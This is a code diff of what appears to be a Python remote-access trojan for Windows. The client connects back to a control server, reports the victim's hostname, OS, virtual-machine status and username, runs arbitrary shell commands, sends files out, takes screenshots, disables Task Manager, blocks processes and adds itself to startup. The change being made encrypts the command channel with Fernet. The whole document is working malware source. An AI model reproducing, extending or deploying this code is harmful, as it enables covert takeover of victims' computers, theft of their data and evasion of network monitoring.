@@ -3,6 +3,7 @@ import win32api, winerror, win32event
 from shutil import copyfile
 from winreg import *
 from io import StringIO, BytesIO
+from cryptography.fernet import Fernet
 
 strHost = "127.0.0.1"
 # strHost = socket.gethostbyname("")
@@ -87,14 +88,15 @@ def remove_from_startup():
 
 
 def server_connect():
-    global objSocket
+    global objSocket, objEncryptor
     while True:  # infinite loop until socket can connect
         try:
             objSocket = socket.socket()
             objSocket.connect((strHost, intPort))
         except socket.error:
             time.sleep(5)  # wait 5 seconds to try again
-        else: break
+        else:
+            break
 
     arrUserInfo = [socket.gethostname()]
     strPlatform = f"{platform.system()} {platform.release()}"
@@ -104,13 +106,16 @@ def server_connect():
         strPlatform += " (Virtual Machine) "
     arrUserInfo.extend([strPlatform, os.environ["USERNAME"]])
 
-    send(json.dumps(arrUserInfo).encode())
+    objSocket.send(json.dumps(arrUserInfo).encode())
+
+    objEncryptor = Fernet(objSocket.recv(intBuff))
+
 
 # function to receive data
-recv = lambda buffer: objSocket.recv(buffer)
+recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))
 
 # function to send data
-send = lambda data: objSocket.send(data)
+send = lambda data: objSocket.send(objEncryptor.encrypt(data))
 
 if blnMeltFile: meltFile()
 if blnAddToStartup: startup(True)
@@ -156,7 +161,8 @@ def MessageBox(message):
     strScript = os.path.join(TMP, "m.vbs")
     with open(strScript, "w") as objVBS:
         objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
-    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                     shell=True)
 
 
 def screenshot():
@@ -226,7 +232,7 @@ def receive(data):
     send(f"{os.path.getsize(data)}".encode())
     time.sleep(1)
     with open(data, "rb") as objFile:
-        send(objFile.read()) # Send Contents of File
+        send(objFile.read())  # Send Contents of File
 
 
 def lock():
@@ -252,7 +258,8 @@ def command_shell():
             break
 
         elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
-            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                          stdin=subprocess.PIPE, shell=True)
             if objCommand.stderr.read().decode() == "":  # if there is no error
                 strOutput = (objCommand.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                 os.chdir(strOutput)  # change directory
@@ -260,7 +267,8 @@ def command_shell():
                 bytData = f"\n{os.getcwd()}>".encode()  # output to send the server
 
         elif len(strData) > 0:
-            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                          stdin=subprocess.PIPE, shell=True)
             strOutput = objCommand.stdout.read() + objCommand.stderr.read()  # since cmd uses bytes, decode it
             bytData = strOutput + b"\n" + os.getcwdb() + b">"
         else:
@@ -322,7 +330,8 @@ def vbs_block_process(process, popup=False):
     with open(strScript, "w") as objVBSFile:
         objVBSFile.write(strVBSCode)
 
-    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)  # run the script
+    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                     shell=True)  # run the script
 
 
 def disable_taskmgr():
@@ -330,7 +339,8 @@ def disable_taskmgr():
     if not blnDisabled:  # if task manager is already disabled, enable it
         send(b"Enabling ...")
 
-        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                         stdin=subprocess.PIPE, shell=True)
 
         blnDisabled = True
     else:
@@ -380,7 +390,8 @@ def run_command(command):
     LogOutput = b"\n"
 
     if len(command) > 0:
-        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                                      shell=True)
         LogOutput += objCommand.stdout.read() + objCommand.stderr.read()
     else:
         LogOutput += b"Error!"
